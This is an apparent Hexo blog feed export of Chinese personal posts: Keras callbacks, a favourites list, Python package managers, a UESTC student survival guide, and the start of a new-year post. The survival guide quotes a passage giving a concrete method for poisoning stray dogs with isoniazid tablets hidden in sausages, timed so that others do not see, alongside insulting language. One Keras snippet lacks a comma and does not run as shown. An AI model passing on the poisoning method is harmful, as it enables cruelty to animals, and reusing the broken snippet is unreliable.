<p>EarlyStopping中断训练, ModelCheckpoint保存模型,如 <pre class="line-numbers language-python" data-language="python"><code class="language-python">callbacks_list <span class="token operator">=</span> <span class="token punctuation">[</span>
keras<span class="token punctuation">.</span>callbacks<span class="token punctuation">.</span>EarlyStopping<span class="token punctuation">(</span>
monitor<span class="token operator">=</span><span class="token string">'acc'</span><span class="token punctuation">,</span>
patience<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>
<span class="token punctuation">)</span><span class="token punctuation">,</span>
keras<span class="token punctuation">.</span>callbacks<span class="token punctuation">.</span>ModelCheckpoint<span class="token punctuation">(</span>
filepath<span class="token operator">=</span><span class="token string">'my_model.h5'</span><span class="token punctuation">,</span>
monitor<span class="token operator">=</span><span class="token string">'val_loss'</span><span class="token punctuation">,</span>
save_best_only<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
<span class="token punctuation">)</span>
<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre> 改变学习率,ReduceLROnPlateau函数 <pre class="line-numbers language-python" data-language="python"><code class="language-python">callbacks_list <span class="token operator">=</span> <span class="token punctuation">[</span>
keras<span class="token punctuation">.</span>callbacks<span class="token punctuation">.</span>ReduceLROnPlateau<span class="token punctuation">(</span>
monitor<span class="token operator">=</span><span class="token string">'val_loss'</span>
factor<span class="token operator">=</span><span class="token number">0.1</span><span class="token punctuation">,</span>
patience<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">,</span>
<span class="token punctuation">)</span>
<span class="token punctuation">]</span>
model<span class="token punctuation">.</span>fit<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">,</span>
epochs<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">,</span>
batch_size<span class="token operator">=</span><span class="token number">32</span><span class="token punctuation">,</span>
callbacks<span class="token operator">=</span>callbacks_list<span class="token punctuation">,</span>
validation_data<span class="token operator">=</span><span class="token punctuation">(</span>x_val<span class="token punctuation">,</span> y_val<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<h2 id="参考">参考</h2>
<ol type="1">
<li><span class="exturl" data-url="aHR0cHM6Ly9rZXJhcy5pbw==">keras官方文档<i class="fa fa-external-link-alt"></i></span></li>
<li>Python深度学习</li>
</ol>
]]></content>
      <categories>
        <category>笔记&amp;札记</category>
      </categories>
      <tags>
        <tag>炼丹</tag>
        <tag>keras</tag>
      </tags>
  </entry>
  <entry>
    <title>喜欢的东东</title>
    <url>/b27a/</url>
    <content><![CDATA[<p>My Collection <a id="more"></a> <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/20190916114948.png"/></p>
<h2 id="关于入侵物种的题外话">关于入侵物种的题外话</h2>
<p>这是题外话，可以直接跳过本节看后面的</p>
<p>首先讲一句题外话，流浪猫、流浪狗是危害相当大的入侵物种，威胁一点不比红耳龟、罗非、克氏原螯虾、食蚊鱼小，可以参见<span class="exturl" data-url="aHR0cHM6Ly93d3cubmF0dXJlLmNvbS9hcnRpY2xlcy9uY29tbXMyMzgw">关于散养猫的nature主页文章<i class="fa fa-external-link-alt"></i></span> 应该<font size="4">直接扑杀或关在室内收养</font><br />
我反对领养放归绝育等所谓TNR行为，这就是对生态十分不负责任的绥靖和伪善，微博上一些所谓科普圈大v，怕招惹猫奴狗奴掉粉影响做生意，居然支持绝育放归，反对扑杀，根本配不上做科普博主和环保人士。 （流浪猫问题可以看看前百度猫吧吧主<span class="exturl" data-url="aHR0cHM6Ly93ZWliby5jb20vcC8xMDA1MDUyMTMyNTQ4MTcw">火巳<i class="fa fa-external-link-alt"></i></span>的态度。） <br><font size="3">生态 &gt;&gt; 单一物种保护 &gt;&gt; 动物福利</font><br/> 比如，某开水，某博物杂志。 博物12年之前还算不错，后来就掉钱眼里了。连中医药问题都不敢说，连谭医生都敢怼红毛，你一个科普大v啥也不敢说，杂志本身质量也断崖式下跌，原来好歹有点靠谱内容，现在书里网上全程插科打诨卖萌，已经不值得关注了，再见</p>
<p>开水经常洗地，不过这在微博似乎是一个广为人知的事情，这里不多说了。当然果壳那里有洗地机成吨出没，大家笑一笑就好。还有youtube搬运工刘dark先生，咳咳。<br />
大家还是要擦亮眼睛，人心不古啊，科普juan的姿势水平真是令人捉急。</p>
<p>入侵物种等一系列头大的问题，以后有空专门写一篇吧，这里不多讲了。</p>
<p><font size="3">环境问题可以看看<span class="exturl" data-url="aHR0cHM6Ly9ib29rZG93bi5vcmcveXVmcmVlL2hqaGJiLw==">环境黑板报<i class="fa fa-external-link-alt"></i></span></font> 科普讲堂系列文章不错, 生化环材的就业和现状也可以参考</p>
<h2 id="花鸟鱼虫">花鸟鱼虫</h2>
<h3 id="网站">网站</h3>
<ol type="1">
<li><span class="exturl" data-url="aHR0cDovL3d3dy5jcWgyby5jb20v">两江中国原生论坛<i class="fa fa-external-link-alt"></i></span> 国内最大的原生鱼网站,饿老大的网站，十多年了，也没啥广告和捐款，全靠个人撑着，算是比较良心的了，十年前感觉非常热闹，现在比较冷清了(现在贴吧和BBS基本都在没落，大势所趋啊，没办法，中昆论坛等大站都关了，可惜)。论坛几经改版，03年至今的老网虫数据都还留着，目前新版还在建，但是今年经常加载很慢。</li>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuam9yaXNkZXJhZWR0LmJlLw==">https://www.jorisderaedt.be/<i class="fa fa-external-link-alt"></i></span> 一位大触画家，<span class="exturl" data-url="aHR0cHM6Ly93d3cuam9obmJhbm92aWNoZmluZWFydC5jb20v">https://www.johnbanovichfineart.com/<i class="fa fa-external-link-alt"></i></span> 另一位<br />
</li>
<li><span class="exturl" data-url="aHR0cDovL21pY3Jvc2N1bHB0dXJlLm5ldC9tYXJpb24tZmxpZ2h0bGVzcy1tb3RoLmh0bWw=">http://microsculpture.net/marion-flightless-moth.html<i class="fa fa-external-link-alt"></i></span> 各种高清昆虫照</li>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5hdHVyYWxpc3Qub3JnLw==">iNaturalist<i class="fa fa-external-link-alt"></i></span> 一个物种鉴定社区，大佬云集</li>
<li><span class="exturl" data-url="aHR0cDovL3d3dy5hbXBoaWJpYWNoaW5hLm9yZy8=">中国两栖类<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuZGF2aWRoZXJhc2ltdHNjaHVrLmNvbS8=">David Herasimtschuk<i class="fa fa-external-link-alt"></i></span> 北美水生物，<span class="exturl" data-url="aHR0cDovL3d3dy5pc2FhY3N6YWJvLmNvbS8=">http://www.isaacszabo.com/<i class="fa fa-external-link-alt"></i></span>还有这个</li>
</ol>
<h2 id="网站-1">网站</h2>
<ol type="1">
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cud29sZnJhbWFscGhhLmNvbS8=">WolframAppha<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXQtc2NtLmNvbS9ib29rL2VuL3Yy">git教程<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cDovL3d3dy41Mm5scC5jbi8=">52nlp<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cucHRhYmxlLmNvbS8=">元素周期表<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9pbmthcm5hdGUuY29tLw==">在线地图绘制<i class="fa fa-external-link-alt"></i></span></li>
<li>draw.io</li>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuY2hhbmdoYWkub3JnLw==">卢昌海的主页<i class="fa fa-external-link-alt"></i></span> （本人完全不赞成其政治立场）</li>
<li><span class="exturl" data-url="aHR0cDovL3d3dy5qb3lmdWxwaHlzaWNzLm5ldA==">乱讲区<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9jaGFvbGkuY2x1Yi8=">超理论坛<i class="fa fa-external-link-alt"></i></span></li>
</ol>
<h2 id="音游文娱">音游文娱</h2>
<ol type="1">
<li>Hollow Knigkt 不再有梦</li>
<li>kr系列塔防（3&gt;1≥2）（不包括kr4）</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9nYWxsZXJ5LmRyeWNhY3R1cy5jb20=">Poly Bridge Gallery<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9uY2FzZS5tZS90cnVzdC8=">信任的进化<i class="fa fa-external-link-alt"></i></span></li>
</ol>
<h2 id="一些软件">一些软件</h2>
<p>ios的软件就暂时不推荐了，win10和安卓现在不怎么用了，凭着印象写一点吧，反正也没人看。 Linux下的图形软件还是太少了。很多跨平台的都是electron，要不就是web版，几乎把KDE或者LXDE桌面省下来的内存资源全给吃了，对渣配置机子实在不怎么友好。</p>
<h3 id="ssh客户端">ssh客户端</h3>
<p>一般直接ssh命令连上去，但是教研室机子加上自己的VPS多了，一个一个全敲命令写脚本忙不过来，尤其是有的时候又是代理又是跳板的。外加本人非命令行键盘控，总想找个客户端，win上有xshell和Mobaxterm（这个用起来略卡，功能是真的全），我非常喜欢Mobaxterm，可惜Mobaxterm只有windows版本的。试了很多挑出来这两个，都在开发维护更新中。</p>
<h4 id="terimus">terimus</h4>
<p>electron应用（相信大家看到electron都知道这意味着什么），漂亮、功能有点少、占内存高，略卡。在</p>
<h4 id="asbru-cm">asbru-cm</h4>
<p><a href="https://github.com/asbru-cm/asbru-cm/"><em>Ásbrú Connection Manager</em></a>一个功能足够全的客户端，勉强能达到Mobaxterm七成的水平。</p>
<h3 id="阅读器">阅读器</h3>
<h4 id="静读天下">静读天下</h4>
<p>安卓下最好的阅读器没有之一</p>
<h4 id="foliate">foliate</h4>
<p>epub阅读器，足够小巧，功能恰好够用（舒服程度和功能不如安卓版静读天下，单就体验略逊于老edge）</p>
<h3 id="kde桌面组件">KDE桌面组件</h3>
<h4 id="event-calendar">event calendar</h4>
<p>就这个感觉还行，别的花里胡哨的我也没折腾, latte-dock也不错，可惜太吃内存了</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yay -S plasma5-applets-eventcalendar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
]]></content>
      <categories>
        <category>杂七杂八</category>
      </categories>
      <tags>
        <tag>花鸟鱼虫</tag>
        <tag>Collection</tag>
      </tags>
  </entry>
  <entry>
    <title>Pythonic手账</title>
    <url>/a343/</url>
    <content><![CDATA[<p>等待填坑 <a id="more"></a></p>
<h2 id="碎碎念">碎碎念</h2>
<p>2020年了，python2该退休了（真是不太想再看到python2了，祖传依赖令人头大）</p>
<p>安利包管理工具poetry，试了都说好</p>
<p>python3.8怕是串了Go和C++的味，算了，真香</p>
<h2 id="python多版本管理">python多版本管理</h2>
<p>python的包管理是个很混乱的事， 一般单版本基本上没事，但是装了N个版本，甚至还有python2，麻烦就来了，一不小心就被坑，尤其是在大家都用的服务器上。（这上面有2.7，3.5，3.6和师兄炼丹装的conda3.7、3.6，不要问我为什么linux装conda，师兄干的）</p>
<p>我用自己的linux用户可以避开root用户底下一些混乱环境（比如conda） 主要的问题是切换python版本和python包管理，切换python版本一般用pyenv；包管理选择很多，一直没发现特别完美的工具。直到，发现了Poetry</p>
<h3 id="pyenv">pyenv</h3>
<p>pyenv用来切换python版本，配合其他工具管理包</p>
<h3 id="venv和virtualvenv">venv和virtualvenv</h3>
<p>venv是<span class="exturl" data-url="aHR0cHM6Ly9kb2NzLnB5dGhvbi5vcmcvemgtY24vMy90dXRvcmlhbC92ZW52Lmh0bWw=">python3官方的包管理工具<i class="fa fa-external-link-alt"></i></span>，virtualvenv兼容py2、3，这两个感觉用的最多了，看到别人的很多项目都用的这个，pycharm默认也是这玩意 没什么特殊需求就用这个吧</p>
<h3 id="pipenv">pipenv</h3>
<p>一个类似Ruby的Bundler的东西 纯指定依赖，使用体验比上面那个好，有一点慢 （不推荐在win上用）</p>
<p>就跟npm差不多，和node_modules差不多的Pipfile（存放本地包），和npm的package-lock.json差不多的Pipfile.lock（版本锁）</p>
<p>但是，这家伙会趁你不注意偷偷更新你的依赖。注意不要被它的自动更新坑了，你以为它能给你锁定版本，其实不能。</p>
<h3 id="poetry">Poetry</h3>
<p>用了一阵发现这个挺好，喜欢</p>
<p>能管理python版本和python的包，还能用来打包（这个打包感觉比setuptools舒服不少） 配置文件是单个toml，很舒服，依赖在poetry.lock里面</p>
<p>一个小问题是初次加载依赖有点慢，原因见<span class="exturl" data-url="aHR0cHM6Ly9weXRob24tcG9ldHJ5Lm9yZy9kb2NzL2ZhcS8jd2h5LWlzLXRoZS1kZXBlbmRlbmN5LXJlc29sdXRpb24tcHJvY2Vzcy1zbG93">这里<i class="fa fa-external-link-alt"></i></span>。这也不能怪poetry，PyPI上那么多库，还有不少野库，很多库并没有规范声明Metadata，poetry没法通过调PyPI的API判断该下哪种版本的包，就只能把所有的都拉下来然后判断该用哪个</p>
<p>我们打开poetry.lock文件,可以看到，一个版本所有的发行包（packages）都被拉了下来</p>
<figure>
<img src="/a343/image-20200427232343931.png" alt="poetry.lock" /><figcaption aria-hidden="true">poetry.lock</figcaption>
</figure>
<p>这个目前无解 &gt;At the moment there is no way around it.</p>
<p>如果再次用到某个库，poetry之前缓存了发行信息，不会出现那种全下一遍的事了 &gt;Once Poetry has cached the releases' information, the dependency resolution process will be much faster.</p>
<p>目前还没有太好的办法，在<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3B5dGhvbi1wb2V0cnkvcG9ldHJ5L2lzc3Vlcy8yMDk0I2lzc3VlY29tbWVudC02MDk2NDgxOTQ=">issue评论区<i class="fa fa-external-link-alt"></i></span>看到一个扭曲的方法</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">poetry <span class="token builtin class-name">export</span> -f requirements.txt <span class="token operator">></span> requirements.txt
python -m pip <span class="token function">install</span> -r requirements.txt
poetry <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h3 id="docker虚拟机">Docker&amp;虚拟机</h3>
<p>Django之类的项目部署的时候推荐Docker 一般开发环境没有必要上Docker，真机就挺好，Docker不熟悉的反而可能造成不少麻烦(比如网络部分那堆坑)，怕搞乱环境不如直接上虚拟机。 Docker的镜像有官方的python，但是非常大，上G。如果自己写Dockerfile构建一个，缩减镜像，调度每个容器的内存，都是远比前面那几个东西麻烦的事情。 Docker我感觉并不适合个人开发环境，感觉部署和运行的时候方便点，用来当开发环境体验不是太好。 Docker在调试的时候并不太舒服，而且对Docker初学者来说，网络那里很多坑，为了方便或节省时间用Docker配python的开发环境 但是这么一配置，怎么比原来麻烦多了，Docker狂热爱好者吹嘘的部署方便这里在需要调试的时候并没有什么优势。 虽然Docker本身并不吃你太多内存，但是Docker容器跑起来，如果不调度和限制，经常占了好多内存，虽然写python一般也不在乎在这个。</p>
<h3 id="anaconda">anaconda</h3>
<p>我反正不喜欢，没怎么用过，看到这种全家桶我就害怕（早年360和金山留下的阴影，请谅解）。 把python当matlab用的、习惯matlab那种又大又卡但是科学计算功能齐全的全家桶的人可以装个这个。 win10有些包很难装，倒是可以把ananconda当jupyter notebook的win10安装工具人；平时就写写python玩就不要装这玩意了，打开win10的应用商店，搜python，点安装，好了，用吧 炼丹CUDA之类的建议出门左转用Linux，win10跟torch之类的东西八字不合，这是conda也挽救不了的</p>
<h2 id="参考">参考</h2>
<ol type="1">
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cucHl0aG9uLm9yZy9kZXYvcGVwcy9wZXAtMDAwOC8=">PEP8<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9ndW9ydWliaWFvLmdpdGJvb2tzLmlvL2VmZmVjdGl2ZS1weXRob24vY29udGVudC8=">Effective Python 翻译版<i class="fa fa-external-link-alt"></i></span></li>
<li>Fluent Python</li>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cucHlsaW50Lm9yZy8=">pylint<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9weXRob24tcG9ldHJ5Lm9yZy8=">poetry官网<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RlcGhlbGwvZGVwaGVsbA==">dephell打包工具<i class="fa fa-external-link-alt"></i></span></li>
</ol>
]]></content>
      <categories>
        <category>不务正业系列</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>清水寺生存指北</title>
    <url>/40f3/</url>
    <content><![CDATA[<p>你说我一个渣渣，硬件不精，软件不熟，边缘学院，劝退专业，没有国奖，没有论文，现在刚大四保完研都还没毕业，怎么就有脸来写生存指北了呢？ <a id="more"></a></p>
<p>当年看到上交的那个上海交通大学生存手册，还是在大一。三年一晃而过，现在再看，我是笑不出来，我眼泪在肚子里流。</p>
<p>国内理工科都有不少相似的问题，我感觉至少有七成问题是相似的（上交的那份生存指南也有十年了，只有小部分政策变化，大部分情况几乎没怎么变，放在今天依然是合适的）。但是每个学校都需要一个生存指南，剩下的三成大一新生是不太容易从报喜不报忧的学校官方账号、各怀鬼胎的老师、辅导员、坑蒙拐骗装腔作势狐假虎威的学长学姐那里打听到的。</p>
<p>看到大一大二的一些同学年复一年在走弯路，于心不忍，还是写点东西，罢了。</p>
<h2 id="写在前面的话">写在前面的话</h2>
<ul>
<li>大佬就不用看了，出门右转去打电赛/ACM/科研</li>
<li>出国的同学也不用看了，出门左转河畔《成电飞跃手册》（现在的国际形势，想出国的同学不推荐来在实体清单上的你电）</li>
<li>本文不具有时效性，大新闻实时放送看这里<span class="exturl" data-url="aHR0cHM6Ly91ZXN0Yy5pY3Uv">UESTC.icu<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<h2 id="成电笑话">成电笑话</h2>
<ul>
<li><p>建校初年，苏联援建，师承苏系（看到那个苏式主楼了吗），笑话当然也一脉相承啦。</p></li>
<li><p>一个川农的男生，一个西交的男生，一个川大的男生和一个成电的男生一起去请教一一个西财的男生怎么找女朋友。西财的说:“很简单，邀请你喜欢的女生，在周末到市里逛逛，买点礼物，请她吃饭，久而久之她就对你有好感了。”川大的问: "什么是周末?”西交的问:“什么是女生?”川农的问:“什么是市里？” 成电的问：“什么是周末？什么是女生？什么是市里？”</p></li>
<li><p>“同学，请问您在支持课程改革方面动摇过🐴” “我和课程改革一起动摇”</p></li>
<li><p>“拉宾诺维奇，你关注成电新闻吗” “当然，不然我怎么知道我们在课程改革”</p></li>
<li><p>问：教育改革和科学有什么区别？ “如果教育改革是科学的，那他们应该先拿成教学生当小白鼠”</p></li>
<li><p>校领导：“我们要教育改革，培养条理清晰地写作和连贯的表达能力！” 同学们：“太好了，那要怎么做呢” 教务处：“增加马原毛概思修的课时和考试要求，开卷全部改为闭卷”</p></li>
<li><p>教务处：我们要进行教育改革，请大家在 指 定 时 间 之内将您的宝贵意见、建议反馈至教务处。 （温馨提醒，文件尚未正式发布，请勿外传） 全校师生：什么时候? 教务处：10 全校师生：10什么？10个月？还是10天? 教务处：9，8，7......</p></li>
</ul>
<h2 id="一入ee深似海条条大路转cs">一入EE深似海，条条大路转CS</h2>
<p>你电的专业设置非常繁杂，吹的天花乱坠，但是我觉得可以全砍了（尤其是什么光电、生医，国内既没有足够的工作岗位，也不像数学那样出来转行也不会太废），就把工科的本科设置并成EE/CS。当然了，现在EE八成也是打算转CS的（10年前并不是这样，通信很火，土木很火，计算机冷淡，搞计算机视觉和自然语言处理就业惨淡） 没办法，16年后成都房价经历了限购等几波上涨，留给大家的选择不多了，要恰饭的嘛 （家里有矿请随意） 我知道很多同学心怀梦想，但是四年后基本都出国/读研/考公、教师</p>
<h2 id="上课">上课</h2>
<h3 id="学会水课">学会水课</h3>
<blockquote>
<p><strong>天变不足惧，人言不足恤，祖宗之法不足守</strong></p>
</blockquote>
<p>你电有很多课，就是在拿着N年以前的课本/PPT浪费学生的生命。<a href="#fn1" class="footnote-ref" id="fnref1" role="doc-noteref"><sup>1</sup></a>要是真傻不拉几地上课跟着老师听，三年时间基本就废了 另外，你电很多老师的水平（这里仅仅指教的课相关领域水平），并不比学完这门课的你高</p>
<p>当你很喜欢一门选修课/老师但是给分低/考试难，不选，旁听</p>
<p>当你遇到一门水课，水</p>
<p>当你遇到一门课不水，但是对你没用/老师不好，水</p>
<p>当你遇到一门课不水，老师挺好，但是对你以后工作/出国没用，水</p>
<h3 id="c语言">C语言</h3>
<p>大一大多数学院都要学C语言，但是基本都用的谭浩强（计院用的自编教材，约等于魔改版谭浩强；格院用的C Primer Plus）。大部分任课老师的水平嘛，你懂的。我大一还在用VC6，不知现在怎样了，貌似已经换成vs2010那些，完 美 对 标 计 算 机 二 级。</p>
<p>如果搞硬件，C51、stm32、其他的嵌入式板子，C是很重要的，以后就算转软，学好C打底也是很重要的。但是大多数老师只讲些语法和循环以及++++i++++之类的鬼才操作，指针啊内存啊都不好好讲的（也可能是课时太少，来不及讲）</p>
<p>下面这些是我班主任c老师（<del>什么？班主任？别问我为什么你电一所大学居然还有班主任，你电就是这么没天理，忍了吧</del>）班会的时候说他要教大一C语言了，问我有什么建议，我就写了下面这些给他。额，偶滴班主任是搞生物心理学实验之类的，也做过一点脑电采集电路，可能10年没自己写过C了，水平你懂的。对了，他上学期还被强行指派去教一门Unix操作系统的课，他之前还给我们上过精密仪器和生物心理学实验；水平嘛，嗯，这水平问题好像也不怪他。（<del>什么？他为什么要教这么多课？没办法，他是苦逼的讲师，那些大教授忙于捞钱，又不愿意给我们上课。虽然学校规定教授必须上课，实际上嘛，比如某y院长，挂个名，扔给别的老师</del>）</p>
<p>扯多了，下面是当时应班主任邀请写给大一新生的建议。 老师很虚心听取建议的，我还是成功劝退了你电SM学院一半新生使用谭浩强和VS2010，改用k&amp;r，善哉，善哉。 (教材质量赶超计院和格院一刚！)</p>
<h4 id="书籍推荐">书籍推荐</h4>
<h5 id="c程序设计语言">《C程序设计语言》</h5>
<p>The C Programming Language, C语言之父写的，豆瓣和亚马逊评分最高的一本。习题也很经典, 有一本配套的习题解答。github上也有很多习题解答，比如<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2NjcGFsZXR0ZXMvdGhlLWMtcHJvZ3JhbW1pbmctbGFuZ3VhZ2Utc2Vjb25kLWVkaXRpb24tc29sdXRpb25z">ccpalettes/the-c-programming-language-second-edition-solutions<i class="fa fa-external-link-alt"></i></span></p>
<h5 id="c-primer-plus"><span class="exturl" data-url="aHR0cHM6Ly9ib29rLmRvdWJhbi5jb20vc3ViamVjdC8xMjQwMDAyLw==">C Primer Plus<i class="fa fa-external-link-alt"></i></span></h5>
<p>格拉斯哥学院在用的教材，但是非常详细（啰嗦）</p>
<h5 id="c语言入门更简单的书籍"><span class="exturl" data-url="aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8xOTY5NDgyMw==">C语言入门更简单的书籍<i class="fa fa-external-link-alt"></i></span></h5>
<p>这个文章里有适合入门的几本书,比k&amp;r那本更简单一点</p>
<h5 id="c专家编程c陷阱与指针等">C专家编程、C陷阱与指针等</h5>
<p>适合进阶阅读，大一课多</p>
<h5 id="如果还是要用谭浩强">如果还是要用谭浩强</h5>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL21hcnRpbnd1NDIvZmstdGhx">https://github.com/martinwu42/fk-thq<i class="fa fa-external-link-alt"></i></span></p>
<p>哪本书好这种问题, 我建议去图书馆翻一下看看,不同人适合不同风格,找一本适合自己的</p>
<h4 id="编程环境">编程环境</h4>
<p>这种问题见仁见智,一般有IDE（integrated development enviroment）和命令行记事本两种选择。只是上课IDE就够了，真想学好c，建议类unix环境下学习，linux/wsl+命令行+vim/VScode，IDE虽好，不要过于依赖<span class="exturl" data-url="aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC81NDE2OTgyNw==">什么都帮你做了一键运行会让你忽略很多底层的东西<i class="fa fa-external-link-alt"></i></span></p>
<p>学习c语言的时候参照官方通用的c99/c98/c11标准, 差别也不太大,编译器的选择clang或gcc都行,对于初学者而言初学者较少涉及系统和底层,差别也不大(clang可能对初学者更友好些)</p>
<h5 id="vs2010vc2010">vs2010、vc2010</h5>
<p>成电计算机学院上机考试用的vs2010，c语言计算机二级考试用的vc2010。 但是作为ide，现在（2019年）非常古老，功能远不如vs2019。而且正版是收费的。 (虽然有破解版，但这两个老软件在win7和win10上兼容问题非常多。)</p>
<h5 id="codeblocks">codeblocks</h5>
<p>vs系列都过于臃肿，初学者只是学个c语言用这个几乎就是杀鸡用牛刀，<strong>codeblocks</strong>是非常好的一款开源IDE。不少ACM选手都用这个,很多人刷leetcode也用这个。配置省心，功能够用，简单粗暴，还免费，支持标准的c/c++语法。（唯一的缺点就是丑）最适合不想在配置和新建工程以及兼容问题上折腾的初学者。<strong>c-free</strong> 也行。</p>
<h5 id="vscode">VSCode</h5>
<p>这几年很火的微软家开源编辑器<strong>VSCode</strong>，是<em>宇宙第一IDE的亲儿子</em>，颜值比codoblock和vc6.0高到不知哪里去了，虽然本质还是个atom那样的notepad，但配置也不麻烦，装个插件也能像IDE那样一键运行(不过还是推荐你试试命令行)。这种现代编辑器比vim对新手有好多了</p>
<h5 id="vs2019vs2017vs2015">vs2019/vs2017/vs2015</h5>
<p>微软家的<em>宇宙第一IDE</em>，不多解释。而且vs2017 community版免费，功能完全够初学者使用。一个问题是臃肿（也就十几个G吧），另一个问题是<em>vs2017以后不完全支持c99</em>，配置起来很麻烦，不建议c语言初学者使用,适合c++开发！（<em>不写上万行的c++项目就别用宇宙第一IDE了</em>）</p>
<h5 id="clion">clion</h5>
<p>Mac和16G以上内存win/linux系统下强烈推荐clang+<strong>clion</strong>，Jetbrains全家桶真香，有教育优惠，学生免费。跟微软的vs不相上下，而且对c的支持非常好! 但是很吃内存，配置不好就别用了</p>
<h5 id="vim">vim</h5>
<p>clang/gcc/mingw + 命令行 + VSCode/sublime/notepad++ /vim喜爱折腾的同学可以尝试.跨平台开发请试试cmake</p>
<h4 id="其他">其他</h4>
<p>多动手, 多调试, 不会问谷歌, 编程要多练习,不然会变成<span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzMyNjU2MjExMy9hbnN3ZXIvNzE0MDMzNzk4">计算机报告文学<i class="fa fa-external-link-alt"></i></span></p>
<h3 id="高树大雾">高树大雾</h3>
<p>你可能从学长那里听说过杨物运动的传说，不过现在杨物运动已经彻底流产了。 现在高数大物的难度几乎越来越水，电分和模电也越来越水（17级貌似都直接合并了）</p>
<h3 id="思修马原毛概军理形势与政策">思修马原毛概军理形势与政策</h3>
<p>从17年开始加大力度，改为了闭卷，然而问题不大（你要是遇上侯伦广当我没说），上课不用听，期末会划一点重点，搞到往年的题刷一下，原题很多</p>
<h3 id="通识课程">通识课程</h3>
<p>个人认为是L校长的一大败笔，全员水课 核心通识交叉通识是要计入保研和GPA的，这就导致了素质教育和刷分不可调和的矛盾。水课大受欢迎，硬课无人问津甚至因为选课人数过少停课。</p>
<h3 id="未完待续等待填坑">未完待续，等待填坑</h3>
<h2 id="注意安全">注意安全</h2>
<h3 id="流浪猫狗">流浪猫狗</h3>
<p>你电不负责任的猫奴狗奴小动保还是很多的，流浪猫狗也是很多的。保卫处也是并不怎么负责仁的，大家自求多福。下面引用一段helaso的话： &gt;学姐昨天去银桦在门口被狗追，那疯狗追上去用嘴擦到了一下。虽然没流血还是建议学姐去打狂犬疫苗了，也联系了保卫处。今天好了，4只流浪狗在组团门口耍。 打电话给保卫处，他们说最近爱狗人士多不能打狗？？？ 是不是保卫处领导学辅导员和稀泥上瘾了？ 在此我要推荐一款异烟肼神药给保卫处大爷，对人几乎无毒，肺结核病人的救命药，塞到香肠里一两片就能搞死一只狗。早上趁圣母婊学生还没起床让阿姨扫地时撒，晚上天色一暗就能让阿姨收尸了。铁棍打狗还不带枪那是lowb才用的方法了，俄罗斯之前肃清流浪狗就在街上狂撒这药。 保卫处大爷再护着狗爹迟早会有学生被咬出重伤，到时知乎热门等着瞧。</p>
<h3 id="食堂">食堂</h3>
<p>腐败变质的食品很多（早上的包子、饼），还有烟头假牙钢丝球瓷砖大礼包随机放送。如果你去学子一楼，恭喜你，拉肚子几率加倍。</p>
<h2 id="注">注</h2>
<section class="footnotes" role="doc-endnotes">
<hr />
<ol>
<li id="fn1" role="doc-endnote"><p>不是说N年前的书不好，奥本海姆的信号与系统、高德纳的计算机程序设计艺术、k&amp;r的C程序设计语言、TCP/IP协议、朗道、铃木雅臣的模电，都是经典的好书。但是你电的EE/CS行业基本都变化很快，N年前的书基本落后工业界至少N+5年了，而很多变化很快的选修课恰恰喜欢用N年不改的教材（很多还是本校老师自编的垃圾教材）。而且你电不少课本的质量就算没落伍也不比谭某人强（尤其是那些什么电子科大出版社、科学出版社的自编教材），你看多了这种书基本就废了。<a href="#fnref1" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
</ol>
</section>
]]></content>
      <categories>
        <category>彼黍离离</category>
      </categories>
      <tags>
        <tag>你电</tag>
      </tags>
  </entry>
  <entry>
    <title>写在被消灭的路上</title>
    <url>/aa1c/</url>
    <content><![CDATA[<p>庚子年，格外的长 <a id="more"></a></p>
<p>谶言里庚子年破事可不少，现在全世界都看起来不太平，暗流涌动。就不睁眼说瞎话搞些新年大吉之类的玩意了。</p>
<h2 id="庚子鼠年计划">庚子鼠年计划</h2>
